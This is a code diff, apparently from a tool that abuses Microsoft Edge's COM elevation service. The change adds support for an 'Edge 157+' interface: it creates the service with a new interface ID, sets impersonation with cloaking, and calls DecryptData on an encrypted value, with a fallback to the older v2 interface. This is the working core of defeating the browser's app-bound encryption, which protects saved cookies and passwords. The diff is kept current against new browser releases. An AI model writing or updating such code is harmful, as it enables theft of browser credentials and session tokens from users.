@@ -46,8 +46,21 @@ namespace Com
 
         if (isEdge)
         {
+            // Edge 157+: v1/v2 are still in the typelib but unregistered (E_NOINTERFACE)
+            {
+                static const IID kIID_Edge3 = {0x05EB264E, 0x4D60, 0x4F34, {0xAD, 0xB7, 0x1F, 0x98, 0x3E, 0x93, 0x0A, 0x79}};
+                Microsoft::WRL::ComPtr<IEdgeElevator3EdgeFinal> elevator3;
+                hr = CoCreateInstance(clsid, nullptr, CLSCTX_LOCAL_SERVER, kIID_Edge3, &elevator3);
+                if (SUCCEEDED(hr))
+                {
+                    CoSetProxyBlanket(elevator3.Get(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL,
+                                      RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
+                    hr = elevator3->DecryptData(bstrEnc, &bstrPlain, &comErr);
+                }
+            }
+
             // Edge uses a different interface chain with IElevatorEdgeBase
-            if (iid_v2.has_value())
+            if (FAILED(hr) && iid_v2.has_value())
             {
                 Microsoft::WRL::ComPtr<IEdgeElevator2Final> elevator2;
                 hr = CoCreateInstance(clsid, nullptr, CLSCTX_LOCAL_SERVER, iid_v2.value(), &elevator2);
